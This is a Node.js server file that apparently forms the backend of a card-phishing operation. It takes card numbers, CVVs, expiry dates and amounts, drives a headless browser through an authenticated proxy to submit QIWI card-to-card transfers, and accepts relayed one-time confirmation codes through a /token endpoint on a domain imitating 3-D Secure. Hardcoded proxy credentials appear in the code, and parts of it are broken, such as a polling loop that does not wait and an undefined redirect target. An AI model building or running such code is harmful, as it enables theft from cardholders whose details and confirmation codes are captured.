const puppeteer = require('puppeteer');
const express = require('express');
const cors = require('cors')
const bodyParser = require('body-parser')
const https = require("https"),
  fs = require("fs");

  const obj = {};

const options = {
  key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
  cert: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/fullchain.pem")
};

const app = express()


app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())
app.use(cors())

const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
    const browser = await puppeteer.launch({args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
    const page = await browser.newPage()
    await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
    await page.setViewport({ width: 1920, height: 984 })
    await page.goto('https://qiwi.com/payment/form/31873')
    console.log(2)

    await setTimeout(() => {}, 5000)
    await page.waitForSelector('#app')
    await page.waitForSelector('.na-source-self-289')
    await page.click('.na-source-self-289')


    await page.waitForSelector('input.mask-text-input-form-field-input-control-self-238')

    const input_fields = await page.$$('input.mask-text-input-form-field-input-control-self-238')
    
    await input_fields[0].type(toCard)
    await input_fields[1].type(amount)
    await input_fields[2].type(fromCard)
    await input_fields[3].type(expireDate)

    await page.type('.hidden-text-input-form-field-input-control-self-319', cvv)

    if(email) await page.type('.text-input-form-field-input-control-self-336', email)

    await page.waitForTimeout(1500);
    
    await page.click('.submit-button-298')

    await page.waitForTimeout(10000);

    
    await page.waitForSelector('input')

    obj[toCard+fromCard] = null
    console.log("wait")
    function doStuff() {
      if(!obj[toCard+fromCard]) {//we want it to match
          setTimeout(doStuff, 50);//wait 50 millisecnds then recheck
          return;
      }
    }
    console.log("obj")
  
    doStuff();

    const input = await page.$('input')
    input.type(obj[toCard+fromCard])

    try { 
      if(await page.waitForXPath('//*[contains(text(), "Ошибка платежа") or contains(text(), "Платеж проведен")]', {timeout: 60000})) {
         const isOne = await page.evaluate(el => el.innerText, await page.$x('//*[contains(text(), "Платеж проведен")]'))
         await browser.close()
         return isOne ? 1 : 0
      } 
     } catch (e) {
         await browser.close()
         return 0
     }
     await browser.close()
}
app.post('/sendData', async (req, res) => {
        const {toCard,amount, fromCard, cvv, expireDate, email} = req.body
        const a = write_data(toCard,amount, fromCard, cvv, expireDate, email)
        res.status(200).json({id: toCard+fromCard})
        const result = await a
        if(result === 1) { 
          return res.redirect(returnURL) 
        } else if (result === 0) { 
          return res.status(500).send()
        }
})

app.get('/token/:id/:code', async (req, res) => {
  const {id, code} = req.params
  obj[id] = code
  return res.status(200).send()
})

app.listen(5000)
https.createServer(options, app).listen(443);